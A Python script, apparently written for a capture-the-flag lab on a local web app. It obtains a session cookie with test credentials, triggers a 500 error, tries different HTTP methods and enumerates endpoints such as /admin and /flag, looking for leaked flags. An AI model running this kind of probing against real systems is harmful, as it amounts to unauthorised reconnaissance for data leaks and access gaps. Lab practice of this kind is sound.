import requests
import re

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = f"{BASE_URL}/password/test"
DASHBOARD_URL = f"{BASE_URL}/dashboard"

print("[*] Examining 500 error page for data leakage\n")

# Get a valid session cookie
auth_data = {'username': 'test', 'password': 'test', 'user_id': '10032'}
auth_resp = requests.post(PASSWORD_TEST_URL, data=auth_data, allow_redirects=False)

if 'Set-Cookie' in auth_resp.headers:
    session_cookie = auth_resp.headers['Set-Cookie'].split('session=')[1].split(';')[0]
    print(f"[+] Got session cookie: {session_cookie[:50]}...\n")
    
    # Access dashboard to trigger 500 error
    cookies = {'session': session_cookie}
    dash_resp = requests.get(DASHBOARD_URL, cookies=cookies)
    
    print(f"[+] Dashboard response:")
    print(f"Status: {dash_resp.status_code}")
    print(f"Headers: {dict(dash_resp.headers)}")
    print(f"Length: {len(dash_resp.text)}B")
    print(f"\n[+] Full response body:")
    print(dash_resp.text)
    
    # Check ALL headers for potential flag/data leakage
    print(f"\n[+] Checking headers for data:")
    for header, value in dash_resp.headers.items():
        if 'FLAG' in value or len(value) > 100:
            print(f"  {header}: {value}")
        
        # Check for FLAG pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', value)
        if flag_match:
            print(f"\n  [!] FLAG IN HEADER {header}: {flag_match.group(0)}")
    
    # Check response body for FLAG
    flag_match = re.search(r'FLAG\{[^}]+\}', dash_resp.text)
    if flag_match:
        print(f"\n[!] FLAG IN BODY: {flag_match.group(0)}")
    
    print(f"\n{'='*60}\n")
    
    # Try accessing with error handling enabled to see if we get more details
    print("[+] Trying dashboard with different request methods\n")
    
    for method in ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD']:
        try:
            if method == 'GET':
                resp = requests.get(DASHBOARD_URL, cookies=cookies)
            elif method == 'POST':
                resp = requests.post(DASHBOARD_URL, cookies=cookies)
            elif method == 'PUT':
                resp = requests.put(DASHBOARD_URL, cookies=cookies)
            elif method == 'DELETE':
                resp = requests.delete(DASHBOARD_URL, cookies=cookies)
            elif method == 'OPTIONS':
                resp = requests.options(DASHBOARD_URL, cookies=cookies)
            elif method == 'HEAD':
                resp = requests.head(DASHBOARD_URL, cookies=cookies)
            
            print(f"{method}: Status {resp.status_code}, Length {len(resp.text) if resp.text else 0}B")
            
            if resp.status_code != 500 and len(resp.text) > 0:
                print(f"  [+] Different response!")
                print(f"  Content: {resp.text[:500]}")
                
                flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
                if flag_match:
                    print(f"\n  [!] FLAG: {flag_match.group(0)}")
        except Exception as e:
            print(f"{method}: Error - {e}")
    
    print(f"\n{'='*60}\n")
    
    # Try accessing other potential endpoints with the session cookie
    print("[+] Trying other endpoints with session cookie\n")
    
    test_endpoints = [
        "/",
        "/dashboard",
        "/profile",
        "/account",
        "/settings",
        "/api/user",
        "/user/10032",
        "/admin",
        "/flag"
    ]
    
    for endpoint in test_endpoints:
        try:
            resp = requests.get(BASE_URL + endpoint, cookies=cookies, timeout=3)
            
            if resp.status_code == 200 and len(resp.text) not in [1184, 265]:  # Not login page or 500 error
                print(f"{endpoint}: Status {resp.status_code}, Length {len(resp.text)}B")
                print(f"  Snippet: {resp.text[:300]}")
                
                flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
                if flag_match:
                    print(f"\n  [!] FLAG: {flag_match.group(0)}")
                    print(f"\n  Full response:\n{resp.text}\n")
        except:
            pass

